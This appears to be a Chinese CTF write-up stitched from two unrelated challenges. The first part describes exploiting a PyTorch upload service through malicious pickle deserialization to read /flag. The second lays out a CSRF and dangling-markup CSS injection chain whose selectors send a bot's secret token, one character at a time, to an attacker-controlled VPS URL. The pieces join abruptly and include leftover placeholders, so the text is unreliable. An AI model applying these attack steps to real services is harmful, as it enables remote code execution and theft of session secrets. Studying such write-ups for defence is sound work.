ModelHub

ModelHub 是一个轻量级 PyTorch 模型托管平台，支持上传自定义 .pt 模型并在线推理。入口页面在根路径 /。POST /upload 上传模型文件（必须是合法的 PyTorch 归档），POST /infer 用模型 ID 做一次推理并回显加载后的对象表示。出于性能考虑我们关闭了 weights_only 安全校验。请在容器内读取 /flag。

tcp 60.205.163.215:18028

这里题目说关闭了 weights_only 安全校验，说明没有走安全加载，而是允许完整对象反序列化。

从接口说明可以看出，/infer 会返回：

  • 加载后的对象表示 repr
  • 推理输出

我们先拿普通字符串试了一次，服务端返回了这种结构：

大概是：

  1. model = torch.load(...)
  2. repr(model) 放进响应
  3. 再去调用model(...)做推理

如果 model 是字符串，调用时会报错，但 repr(model) 还是已经被回显了。

这正好适合我们：

  • 把 flag 内容伪装成“加载出来的对象”
  • 即使后面推理失败，flag 也已经在 model_repr 里了

解题思路：

  1. 服务端允许上传 .pt 文件
  2. 服务端用torch.load(..., weights_only=False)去加载它
  3. torch.load 底层会用 Python 的 pickle
  4. pickle 在反序列化时可以执行任意代码
  5. 我们让它在加载时读 /flag
  6. 服务端又把“加载后的对象表示”回显出来，于是 flag 泄露

写一个生成.pt文件的脚本：

运行python build_pt.py readfile exploit-readflag.pt /flag生成exploit-readflag.pt文件

表面上是 PyTorch 归档，实际上 data.pkl 里是恶意 pickle。

攻击链

bot 登录后访问攻击者页面。攻击者页面可以用顶层 popup 表单发起跨站 POST。浏览 器默认 Lax cookie 在短时间内允许这种顶层 POST 带上 session cookie，因此可以 CSRF 管理员的 note 。

初始 note 顺序为：

首先需要创建一个攻击页面（放我们自己的VPS上）,其中要做的几件事：

  1. 通过Csrf把 bot 的第 1 号笔记改成闭合器：'></div>

  2. 新建一个 sink 笔记：<div class=a x='

    • 因为创建接口是 unshift ，sink 会排到私有 note 前面。页面渲染时，sink note 打开了一个单 引号属性 x='，之后页面里的所有 HTML，包括私有 note 的 ，都会被浏览器吞 进这个属性值，直到后面的 First Note 中的'> 闭合。

    •   <div class="a" x="...<!--token-->..."></div>
  
  <link rel=stylesheet href="data:text/css,...">
  

  	如果真实 token 下一位是 c，那浏览器就会请求`/p4c`，通过VPS的http日志就能知道

    • 后缀怎么猜：

      •   .a[x*='0-->']{list-style:url(http://VPS:8000/s00)}
  .a[x*='1-->']{list-style:url(http://VPS:8000/s01)}
  ...
  .a[x*='f-->']{list-style:url(http://VPS:8000/s0f)
  <!--code￼11-->

      这样.a 元素的 x 属性里包含了私有 note 的 HTML 注释，也就是 token 。

  3. 反复打开 http://localhost:3000/notes，触发 CSS 命中并把 token 一位一位带回你的服务器

总结攻击页面的逻辑：

  1. POST /notes/1/edit，把 First Note 改成 '></div>
  2. POST /notes/create，创建 sink：<div class=a x='
  3. POST /notes/create，创建 suffix-css
  4. POST /notes/create，创建 prefix-css
  5. 打开 http://localhost:3000/notes
  6. 等自己的服务器收到 /p... 和 /s...
  7. 更新 prefix / suffix
  8. 再 POST /notes/0/edit 和 /notes/1/edit，把两条 CSS 笔记改成更长的版本
  9. 再开一次 /notes
  10. 重复，直到拼满 32 位

拿到token后直接请求/redeem?token=去拿flag即可
